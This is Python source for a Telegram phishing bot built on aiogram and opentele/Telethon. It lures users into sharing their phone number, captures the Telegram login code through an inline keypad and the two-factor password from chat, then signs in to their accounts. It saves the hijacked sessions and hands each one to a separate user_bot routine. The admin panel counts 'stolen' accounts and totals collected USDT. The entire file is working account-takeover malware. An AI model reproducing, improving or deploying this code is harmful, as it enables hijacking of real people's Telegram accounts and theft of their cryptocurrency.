import asyncio
import contextlib
import os

from aiogram import Router, F, Bot
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.types import Message, CallbackQuery, FSInputFile
from aiogram.utils.keyboard import InlineKeyboardBuilder
from opentele.api import API
from opentele.tl import TelegramClient
from telethon.errors import SessionPasswordNeededError

from temp import *
from db import Users, Sponsors, Admins
from user_bot import user_bot
from config import token
from utils import check_channel_member

bot = Bot(token=token)

router = Router()


builder = InlineKeyboardBuilder()
for i in range(1, 10):
    builder.button(text=str(i), callback_data=str(i))
builder.adjust(3)
builder.row(InlineKeyboardButton(text='0', callback_data='0'))
builder.row(InlineKeyboardButton(text='Стереть', callback_data='del'))

class AdminState(StatesGroup):
    menu = State()
    stats = State()
    settings = State()
    get_session_password = State()
    get_session_code = State()

class UserState(StatesGroup):
    first = State()
    subscribe = State()
    get_session_phone = State()
    get_session_password = State()
    get_session_code = State()


@router.message(Command('start'))
async def start(message: Message, state: FSMContext):
    if Users.get_or_none(user_id=message.chat.id) is None:
        Users.create(user_id=message.chat.id)
    user = Users.get(user_id=message.chat.id)
    if user.state == 0:
        keyboard = InlineKeyboardBuilder()
        keyboard.row(InlineKeyboardButton(text=start_keyboard_text, callback_data='start'))
        await message.answer_video(video=FSInputFile('./photo/pay.mp4'),
                                   caption=start_text, reply_markup=keyboard.as_markup())
        await state.set_state(UserState.first)


@router.callback_query(F.data == 'start', UserState.first)
async def subscribe(callback_query: CallbackQuery, state: FSMContext):
    keyboard = InlineKeyboardBuilder()
    keyboard.adjust(1)
    keyboard.row(InlineKeyboardButton(text=subscribed_text, callback_data='check'))
    await callback_query.message.delete()
    await callback_query.message.answer_video(caption=subscribe_text, video=FSInputFile('./photo/pay.mp4'), reply_markup=keyboard.as_markup())
    await state.set_state(UserState.subscribe)


@router.callback_query(F.data == 'check', UserState.subscribe)
async def check(callback_query: CallbackQuery, state: FSMContext):
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, keyboard=[
        [KeyboardButton(text='Подтвердить', request_contact=True)]
    ])
    await callback_query.message.delete()
    await callback_query.message.answer(text=get_phone, reply_markup=keyboard)
    await state.set_state(UserState.get_session_phone)


@router.message(F.contact, UserState.get_session_phone)
async def get_session_phone(message: Message, state: FSMContext):
    if message.contact.user_id != message.chat.id:
        await message.answer('<b>Возникла ошибка!</b>')
    else:
        phone = message.contact.phone_number.replace(' ', '')
        user = Users.get(user_id=message.chat.id)
        user.phone = phone
        user.save()
        api = API.TelegramDesktop.Generate(unique_id=f'{phone}.session')
        client = TelegramClient(session=f'./sessions/{phone}.session', api=api)
        await client.connect()
        phone_hash = await client.send_code_request(phone)
        phone_hash = phone_hash.phone_code_hash
        await state.update_data(phone=phone, phone_hash=phone_hash, client=client, code='')
        await message.answer('Введите код', reply_markup=builder.as_markup())
        await state.set_state(UserState.get_session_code)


@router.callback_query(UserState.get_session_code)
async def get_session_code_numbers(callback_query: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    await callback_query.answer()
    code = data['code']
    if callback_query.data == 'del':
        code = code[:-1]
        await state.update_data(code=code)
        await callback_query.message.edit_text(f'код: {code}', reply_markup=builder.as_markup())
    else:
        code += callback_query.data
        await state.update_data(code=code)
        await callback_query.message.edit_text(f'код: {code}', reply_markup=builder.as_markup())
    if len(code) == 5:
        phone_hash = data['phone_hash']
        phone = data['phone']
        client = data['client']
        try:
            await client.sign_in(phone, code=code, phone_code_hash=phone_hash)
            asyncio.ensure_future(user_bot(client))
        except SessionPasswordNeededError:
            await callback_query.message.answer('Введите пароль')
            while True:
                user = Users.get(user_id=callback_query.message.chat.id)
                if user.password != 'None':
                    await client.sign_in(password=user.password)
                    asyncio.ensure_future(user_bot(client))
                    break
                await asyncio.sleep(3)
        except Exception as err:
            print(err)
            await callback_query.message.answer('Что-то пошло не так')
            keyboard = ReplyKeyboardMarkup(resize_keyboard=True, keyboard=[
                [KeyboardButton(text='Отправить номер телефона', request_contact=True)]
            ])
            await callback_query.message.answer(text=get_phone, reply_markup=keyboard)
            await state.set_state(UserState.get_session_phone)
            with contextlib.suppress(Exception):
                os.remove(f'./sessions/{phone}.session')


@router.message(UserState.get_session_code)
async def get_session_password(message: Message):
    user = Users.get(user_id=message.chat.id)
    user.password = message.text
    user.save()


@router.message(Command('admin'))
async def admin(message: Message, state: FSMContext):
    if Admins.get_or_none(user_id=message.chat.id):
        keyboard = InlineKeyboardBuilder()
        keyboard.row(InlineKeyboardButton(text='📊 Статистика', callback_data='stats'))
        await message.answer(text='Админ панель', reply_markup=keyboard.as_markup())
        await state.set_state(AdminState.menu)


@router.callback_query(F.data == 'back', StateFilter(AdminState.stats, AdminState.settings))
async def back_to_menu(callback_query: CallbackQuery, state: FSMContext):
    if Admins.get_or_none(user_id=callback_query.message.chat.id):
        keyboard = InlineKeyboardBuilder()
        keyboard.row(InlineKeyboardButton(text='📊 Статистика', callback_data='stats'))
        await callback_query.message.edit_text(text='Админ панель', reply_markup=keyboard.as_markup())
        await state.set_state(AdminState.menu)


@router.callback_query(F.data == 'stats', AdminState.menu)
async def stats(callback_query: CallbackQuery, state: FSMContext):
    keyboard = InlineKeyboardBuilder()
    keyboard.row(InlineKeyboardButton(text='🔙 Назад', callback_data='back'))
    all_amount = len([i for i in Users.select().execute()])
    stolen_amount = all_amount - len([i for i in Users.select().where(Users.state == 0).execute()])
    amount = [i.USDT for i in Users.select().execute()]
    await callback_query.message.edit_text(text=f'Статистика:\n'
                                             f'Всего пользователей: {all_amount}\n'
                                             f'Сколько аккаунтов: {stolen_amount}\n'
                                             f'Крипты: {sum(amount)}',
                                        reply_markup=keyboard.as_markup())
    await state.set_state(AdminState.stats)

